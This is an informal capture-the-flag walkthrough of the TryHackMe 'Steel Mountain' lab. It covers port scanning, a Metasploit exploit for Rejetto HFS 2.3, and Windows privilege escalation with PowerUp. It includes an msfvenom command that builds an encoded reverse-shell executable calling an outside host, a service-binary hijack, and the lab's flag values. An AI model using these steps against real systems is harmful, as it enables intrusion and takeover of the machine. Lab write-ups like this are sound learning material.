### Steel Mountain ###

export IP=10.10.29.65


found img dir on the defualt 80 sv...but 403 access denied..

no other dir from gobuster either..

no robots... bummerrrr...kidding

nmap showed 8080...found one more http server running on 8080

its an rejetto http file server v2.3

very vuln to remote code exec..
firing msfconsole...then search CVE....

found the exploit its ranked excellent so thats good..

found the home dir of msf.../usr/share/metasploit-framework/modules/exploits/.. haha xD


exploited using my kali of tryhackme....found a meterpreter shell..
found the flag in C:/Users/bill/Desktop/user.txt

04763b6fcf51fcd7c13abc7db4fd365

### Windows PowerUp ###

https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1

downloaded in /opt/windows/powersploit/powerup



uploaded and executed with powershell

load powershell

powershell_shell

. .\PowerUp.ps1
Invoke-AllChecks


found CanRestartService as true

Name:AdvancedSystemCareService9
path:C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe

generated our malicious code with msfvenom

msfvenom -p windows/shell_reverse_tcp LHOST=10.10.189.176 LPORT=4545 -e x86/shikata_ga_nai -f exe -o Advanced.exe


Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>


finally
i did it 
litrellyyyyyyyyy feel like crying ik its small for many ppl bt i had strugle......................................


cp ASCService.exe C:/Program\ Files\ (x86)/IObit/Advanced\ SystemCare/ASCService.exe


and powershell_shell....

CMD-Service -Name '<Name>'

CMD eg: Stop,Start,Restart

navigated to c:/Users/Administrator/Desktop/

more root.txt:9af5f314f57607c00fd09803a587db80

without metasploit now...

switching to my VM now..

